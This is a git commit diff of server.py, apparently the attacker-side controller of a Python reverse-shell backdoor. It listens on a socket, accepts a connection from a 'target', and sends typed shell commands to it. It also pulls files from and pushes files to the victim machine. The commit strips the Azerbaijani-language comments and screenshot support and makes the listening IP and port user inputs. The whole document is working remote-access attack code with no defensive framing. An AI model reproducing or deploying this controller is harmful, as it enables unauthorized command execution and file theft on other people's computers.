d5d79e60fbb09bd967c710fb0c63136b51ec63f8
revolt36 <141328183+revolt36@users.noreply.github.com>
2023-10-03 12:40:09 +0400

    Update server.py

--- server.py
+++ server.py
@@ -1,67 +1,70 @@
 import socket
 import json
 import os
-import pyscreenshot
-from PIL import Image
+import subprocess
+
 
 def reliable_send(data):
-	jsondata = json.dumps(data)#data adli bir verini json a donusturur(data dict veya list ola biler) metine donusturur
-	target.send(jsondata.encode())#target adli sokete jsondata adli veriyi gonderir ve encode (utf-8) ile byte ceviririk ki internet uzerinde paylasila bilsin
+	jsondata = json.dumps(data)
+	target.send(jsondata.encode())
 
 def reliable_recv():
-	data = '' #alinan verileri depolamak ucun
+	data = ''
 	while True:
 		try:
-			data = data + target.recv(1024).decode().rstrip()#target adli soketten 1024 baytlig veri alib utf-8 formatina cevirib data ya elave edir ve rstrip ile alinan verinin sonundaki bosluqlari qaldirir
-			return json.loads(data)# datani json formatina cevirib dondurur
-		except ValueError:# eger json dondurmezse ValueError vererse
-			continue#dongunun baslangicina geder ve data almaga davam eder
-
+			data = data + target.recv(1024).decode().rstrip()
+			# data = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+			return json.loads(data)
+		except ValueError:
+			continue
 
 def upload_file(file_name):
-        f = open(file_name, 'rb')#rb ile baytlari oxuyurug
-        target.send(f.read())#bayt dizisi oxunur ve targete gonderilir
+        f = open(file_name, 'rb')
+        target.send(f.read())
 
 
 def download_file(file_name):
-	f = open(file_name, 'wb')#alinan verini basqa bir dosyaya yazmaq ucun wb ile aciriq
-	target.settimeout(1)#1 saniye icinde veri alinmazsa dongu biter socket timout xetasi verer
-	chunk = target.recv(1024)#soketten 4096 baytliq veri parcasi alir acilan dosyanin bir bolumu
+	f = open(file_name, 'wb')
+	target.settimeout(1)
+	chunk = target.recv(1024)
 	while chunk:
-		f.write(chunk)#alinan verini chunk dosyasina yaziriq
+		f.write(chunk)
 		try:
 			chunk = target.recv(1024)
-		except socket.timeout as e:#socket timout xetasi alarsa dongu durmasi ucun
+		except socket.timeout as e:
 			break
-	target.settimeout(None)#target soketinin timeoutunu bagliyar ve diger soketler normal isleyer
-	f.close()#dosyani bagliyar
-
+	target.settimeout(None)
+	f.close()
 
 def target_communication():
 	while True:
-		command = input('* Shell~%s: ' % str(ip))#serverden bir command isteyirik
-		reliable_send(command)#reliable_send ile command hedefe gonderirlir hedefte bu commandi alir ver calistirir
+		command = input('* Shell~%s: ' % str(ip))
+		reliable_send(command)
 		if command == 'quit':
 			break
 		elif command == 'clear':
 			os.system('clear')
-		elif command == 'screenshot':
-			pass
 		elif command[:3] == 'cd ':
+			pass
+		elif command == 'ss':
 			pass
 		elif command[:8] == 'download':
 			download_file(command[9:])
 		elif command[:6] == 'upload':
 			upload_file(command[7:])
+		elif command == False:
+			continue
 		else:
 			result = reliable_recv()
 			print(result)
 
+your_ip = input("Enter your ip address: ")
+connection_port = int(input("Enter connection port: "))
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#soketi istifade ederek yeni bir soket nesnesi yaratdim
-sock.bind(('192.168.100.224', 6060))#baglanti adresini verdik 
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind((your_ip, connection_port))
 print('[+] Listening For The Incoming Connections')
-sock.listen(5) #dinlemeye basladiq ve eyni vaxti 5 baglanti acmasini ayarladiq
-target, ip = sock.accept() # gelen baglantini qebul edir (target qebul olunan baglantini temsil edir, ip de baglanan adamin ip adresidir)
+sock.listen(5)
+target, ip = sock.accept()
 print('[+] Target Connected From: ' + str(ip))
 target_communication()
